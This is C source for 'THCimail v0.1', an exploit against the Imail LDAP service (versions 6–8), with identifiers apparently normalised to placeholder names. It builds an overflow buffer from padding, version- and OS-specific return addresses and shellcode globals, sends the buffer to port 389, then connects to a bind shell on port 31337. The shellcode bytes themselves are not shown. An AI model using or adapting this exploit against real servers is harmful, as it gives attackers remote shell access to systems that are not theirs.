
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_2__ TYPE_1__ ;


struct TYPE_2__ {unsigned int s_addr; } ;
struct sockaddr_in {void* sin_port; int sin_family; TYPE_1__ sin_addr; } ;
struct sockaddr {int dummy; } ;
struct hostent {int h_addrtype; int h_length; int h_addr; } ;
typedef int mytcp ;
typedef int WSADATA ;


 int VAR_0 ;
 unsigned int VAR_1 ;
 int VAR_2 ;
 int FUNC_0 (int,int) ;
 int VAR_3 ;
 int FUNC_1 (int) ;
 unsigned char* VAR_4 ;
 unsigned char* VAR_5 ;
 scalar_t__ FUNC_2 (int ,int *) ;
 scalar_t__ FUNC_3 (char*) ;
 int FUNC_4 (unsigned int) ;
 unsigned int FUNC_5 (unsigned int,struct sockaddr*,int) ;
 int FUNC_6 (int) ;
 int FUNC_7 (unsigned char*) ;
 struct hostent* FUNC_8 (char*) ;
 void* FUNC_9 (int) ;
 unsigned int FUNC_10 (char*) ;
 unsigned char* VAR_6 ;
 unsigned char* VAR_7 ;
 unsigned char* FUNC_11 (int) ;
 int FUNC_12 (TYPE_1__*,int ,int ) ;
 int FUNC_13 (unsigned char*,char,int) ;
 int FUNC_14 (char*,...) ;
 int FUNC_15 (unsigned int,unsigned char*,int,int ) ;
 int FUNC_16 (unsigned int) ;
 unsigned char* VAR_8 ;
 int FUNC_17 (unsigned int,int) ;
 unsigned int FUNC_18 (int ,int ,int ) ;
 int FUNC_19 (unsigned char*,unsigned char*) ;
 int FUNC_20 () ;

int FUNC_21(int VAR_9, char *VAR_10[])
{
unsigned int VAR_11,VAR_12,VAR_13,VAR_14,VAR_15,VAR_16,VAR_17,VAR_18;
unsigned char *VAR_19,*VAR_20,*VAR_21;
unsigned int VAR_22=60;
unsigned int VAR_23=68;

struct sockaddr_in VAR_24;
struct hostent * VAR_25;
WSADATA VAR_26;

FUNC_14("\nTHCimail v0.1 - Imail LDAP exploit\n");
FUNC_14("tested on Imail 6-8\n");
FUNC_14("by Johnny Cyberpunk (jcyberpunk@thc.org)\n");

if(VAR_9<4 || VAR_9>4)
FUNC_20();

VAR_16 = (unsigned short)FUNC_3(VAR_10[3]);
switch(VAR_16)
{
case 0:
VAR_18 = VAR_22;
break;
case 1:
VAR_18 = VAR_23;
break;
default:
FUNC_14("\nYou entered an illegal version !\n\n");
FUNC_20();
FUNC_6(-1);
}

VAR_20 = FUNC_11(VAR_18);
FUNC_13(VAR_20,'X',VAR_18);

FUNC_14("imailver = %d\n",VAR_18);

VAR_21 = FUNC_11(2220);
FUNC_13(VAR_21,'X',2220);

VAR_19 = FUNC_11(2650);
FUNC_13(VAR_19,0,2650);

FUNC_14("\n[*] building buffer\n");

FUNC_19(VAR_19,VAR_7);

FUNC_19(VAR_19,VAR_20);

FUNC_19(VAR_19,VAR_6);

VAR_15 = (unsigned short)FUNC_3(VAR_10[2]);
switch(VAR_15)
{
case 0:
FUNC_19(VAR_19,VAR_4);
break;
case 1:
FUNC_19(VAR_19,VAR_4);
break;
case 2:
FUNC_19(VAR_19,VAR_5);
break;
default:
FUNC_14("\nYou entered an illegal OS !\n\n");
FUNC_20();
FUNC_6(-1);
}

FUNC_19(VAR_19,VAR_8);
FUNC_19(VAR_19,VAR_21);

if (FUNC_2(FUNC_0(2,1),&VAR_26) != 0)
{
FUNC_14("WSAStartup failed !\n");
FUNC_6(-1);
}

VAR_25 = FUNC_8(VAR_10[1]);

if (!VAR_25){
VAR_14 = FUNC_10(VAR_10[1]);
}
if ((!VAR_25) && (VAR_14 == VAR_1) )
{
FUNC_14("Unable to resolve %s\n",VAR_10[1]);
FUNC_6(-1);
}

VAR_12=FUNC_18(VAR_0,VAR_3,VAR_2);
if (!VAR_12)
{
FUNC_14("socket() error...\n");
FUNC_6(-1);
}

if (VAR_25 != ((void*)0))
FUNC_12(&(VAR_24.sin_addr),VAR_25->h_addr,VAR_25->h_length);
else
VAR_24.sin_addr.s_addr = VAR_14;

if (VAR_25)
VAR_24.sin_family = VAR_25->h_addrtype;
else
VAR_24.sin_family = VAR_0;

VAR_24.sin_port=FUNC_9(389);

FUNC_14("[*] connecting the target\n");

VAR_17=FUNC_5(VAR_12, (struct sockaddr *) &VAR_24, sizeof (struct sockaddr_in));
if(VAR_17==0)
{
FUNC_15(VAR_12,VAR_19,2650,0);
FUNC_14("[*] Exploit send successfully ! Sleeping a while ....\n");
FUNC_1(1000);
}
else
FUNC_14("\nCan't connect to ldap port!\n");

if(VAR_17==0)
{
FUNC_14("[*] Trying to get a shell\n\n");
VAR_13 = FUNC_18(VAR_0,VAR_3,VAR_2);
VAR_24.sin_port = FUNC_9(31337);
VAR_17 = FUNC_5(VAR_13, (struct sockaddr *)&VAR_24, sizeof(VAR_24));
if(VAR_17!=0)
{
FUNC_14("can't connect to port 31337 ;( maybe firewalled ...\n");
FUNC_6(-1);
}
FUNC_16(VAR_13);
}

FUNC_17(VAR_12,1);
FUNC_4(VAR_12);

FUNC_7(VAR_20);
FUNC_7(VAR_21);
FUNC_7(VAR_19);

FUNC_6(0);
}
